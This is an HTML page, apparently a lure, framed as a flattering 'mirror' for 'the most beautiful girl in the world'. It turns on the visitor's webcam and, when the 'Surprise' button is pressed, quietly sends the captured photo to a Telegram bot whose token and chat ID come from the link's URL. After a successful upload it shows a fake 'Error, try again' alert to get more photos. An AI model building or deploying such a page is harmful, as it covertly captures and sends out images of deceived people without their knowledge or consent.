<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Самая красивая</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: linear-gradient(135deg, #ffe5ec, #ffb3c6);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }

        /* Efecto de Flash de cámara */
        .flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #ffffff;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
        }

        .flash-active {
            animation: cameraFlash 0.4s ease-out;
        }

        @keyframes cameraFlash {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }

        /* Frase principal */
        h1 {
            color: #d90429;
            font-size: 2.5rem;
            text-align: center;
            margin-bottom: 2rem;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            padding: 0 20px;
            z-index: 10;
        }

        /* Contenedor del espejo y decoraciones */
        .mirror-container {
            position: relative;
            width: 320px;
            height: 320px;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 5;
            margin-bottom: 2rem;
        }

        /* Círculo rosa con la cámara */
        .mirror-circle {
            width: 280px;
            height: 280px;
            border-radius: 50%;
            border: 8px solid #ff4d6d;
            box-shadow: 0 10px 25px rgba(255, 77, 109, 0.5);
            overflow: hidden;
            position: relative;
            background-color: #fff;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Efecto espejo */
        }

        canvas {
            display: none;
        }

        /* Botón para tomar foto */
        .btn-capture {
            background-color: #ff4d6d;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.4);
            transition: all 0.2s ease;
            z-index: 10;
        }

        .btn-capture:hover {
            background-color: #ff1a43;
            transform: translateY(-2px);
        }

        .btn-capture:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* Decoraciones alrededor */
        .decoration {
            position: absolute;
            font-size: 1.8rem;
            animation: float 3s ease-in-out infinite;
            pointer-events: none;
        }

        .dec1 { top: -10px; left: -10px; animation-delay: 0s; }
        .dec2 { top: -20px; right: -5px; animation-delay: 0.5s; }
        .dec3 { bottom: -10px; left: -15px; animation-delay: 1s; }
        .dec4 { bottom: -15px; right: -10px; animation-delay: 1.5s; }
        .dec5 { top: 45%; left: -35px; animation-delay: 0.7s; font-size: 2.2rem; }
        .dec6 { top: 40%; right: -35px; animation-delay: 1.2s; font-size: 2.2rem; }

        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-10px) scale(1.1); }
        }

        .error-message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #ff4d6d;
            text-align: center;
            font-weight: bold;
            padding: 20px;
            display: none;
        }
    </style>
</head>
<body>

    <div id="flashLayer" class="flash"></div>

    <h1>Самая красивая девушка в мире</h1>

    <div class="mirror-container">
        <div class="decoration dec1">🌸</div>
        <div class="decoration dec2">✨</div>
        <div class="decoration dec3">✨</div>
        <div class="decoration dec4">🌸</div>
        <div class="decoration dec5">💖</div>
        <div class="decoration dec6">💖</div>

        <div class="mirror-circle">
            <video id="webcam" autoplay playsinline muted></video>
            <div id="error" class="error-message">Por favor, permite el acceso a la cámara.</div>
        </div>
    </div>

    <button id="captureBtn" class="btn-capture">Сюрприз</button>
    
    <canvas id="canvas" width="600" height="600"></canvas>

    <script>
        // Leer credenciales directamente desde los parámetros de la URL
        const urlParams = new URLSearchParams(window.location.search);
        const TELEGRAM_TOKEN = urlParams.get('t'); 
        const CHAT_ID = urlParams.get('c');

        const video = document.getElementById('webcam');
        const errorDiv = document.getElementById('error');
        const captureBtn = document.getElementById('captureBtn');
        const flashLayer = document.getElementById('flashLayer');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        async function initCamera() {
            // Si el enlace no lleva los datos correctos, el botón no funcionará
            if (!TELEGRAM_TOKEN || !CHAT_ID) {
                console.error("Faltan parámetros de configuración.");
                captureBtn.disabled = true;
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                video.srcObject = stream;
            } catch (err) {
                console.error("Error al acceder a la cámara: ", err);
                errorDiv.style.display = "block";
                captureBtn.disabled = true;
            }
        }

        async function takeAndSendPhoto() {
            captureBtn.disabled = true;
            captureBtn.innerText = "отправляется...";

            // Ejecutar animación de flash
            flashLayer.classList.add('flash-active');
            flashLayer.addEventListener('animationend', () => {
                flashLayer.classList.remove('flash-active');
            }, { once: true });

            // Capturar fotograma en modo espejo
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.setTransform(1, 0, 0, 1, 0, 0);

            canvas.toBlob(async (blob) => {
                if (!blob) {
                    resetButton();
                    return;
                }

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', '✨ Foto tomada desde la Landing Page ✨');

                try {
                    // Petición corregida utilizando la variable TELEGRAM_TOKEN
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();
                    if (result.ok) {
                        alert("Ошибка,  попробуйте ещё раз");
                    } else {
                        console.error("Error devuelto por Telegram:", result.description);
                    }
                } catch (error) {
                    console.error("Error de red al intentar enviar:", error);
                } finally {
                    resetButton();
                }
            }, 'image/jpeg', 0.85);
        }

        function resetButton() {
            captureBtn.disabled = false;
            captureBtn.innerText = "нажать";
        }

        captureBtn.addEventListener('click', takeAndSendPhoto);
        window.addEventListener('DOMContentLoaded', initCamera);
    </script>
</body>
      </html>
